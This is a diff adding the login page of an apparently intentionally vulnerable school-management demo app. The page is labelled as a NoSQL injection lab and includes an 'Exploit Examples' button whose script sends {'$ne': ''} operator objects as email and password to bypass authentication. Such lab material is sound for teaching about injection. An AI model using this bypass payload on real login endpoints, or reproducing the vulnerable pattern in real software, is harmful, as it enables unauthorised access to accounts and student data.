@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>School Management - Login</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+  <div class="login-container">
+    <div class="card login-card">
+      <div class="logo-section">
+        <h1>School Management</h1>
+        <p>Student Portal Login</p>
+      </div>
+
+      <div class="vuln-warning">
+        <h4>Warning: NoSQL Injection Demo</h4>
+        <p>This login is vulnerable to NoSQL Injection attacks</p>
+      </div>
+
+      <div id="alert-container"></div>
+
+      <form id="login-form">
+        <div class="form-group">
+          <label for="email">Email</label>
+          <input type="text" id="email" name="email" placeholder="Enter your email" required>
+        </div>
+
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" placeholder="Enter your password" required>
+        </div>
+
+        <button type="submit" class="btn btn-primary" style="width: 100%;">Login</button>
+      </form>
+
+      <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #eee;">
+        <p style="color: #888; font-size: 14px; margin-bottom: 10px;">Exploit Examples:</p>
+        <button class="btn btn-danger" onclick="injectNoSQL()" style="width: 100%; margin-bottom: 10px;">
+          Inject: {"$ne": ""}
+        </button>
+        <button class="btn btn-success" onclick="window.location.href='/dashboard.html'" style="width: 100%;">
+          Go to Dashboard
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    document.getElementById('login-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      try {
+        const res = await fetch('/api/students/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password })
+        });
+
+        const data = await res.json();
+        if (res.ok) {
+          showAlert('Login successful! Welcome ' + data.student.name, 'success');
+          localStorage.setItem('student', JSON.stringify(data.student));
+          setTimeout(() => window.location.href = '/dashboard.html', 1000);
+        } else {
+          showAlert(data.message, 'danger');
+        }
+      } catch (err) {
+        showAlert('Connection error', 'danger');
+      }
+    });
+
+    function injectNoSQL() {
+      fetch('/api/students/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: { "$ne": "" }, password: { "$ne": "" } })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.student) {
+          showAlert('NoSQL Injection successful! Bypassed as: ' + data.student.name, 'success');
+          localStorage.setItem('student', JSON.stringify(data.student));
+        } else {
+          showAlert('No users in database to exploit', 'warning');
+        }
+      })
+      .catch(err => showAlert('Error: ' + err.message, 'danger'));
+    }
+
+    function showAlert(message, type) {
+      document.getElementById('alert-container').innerHTML = 
+        `<div class="alert alert-${type}">${message}</div>`;
+    }
+  </script>
+</body>
+</html>
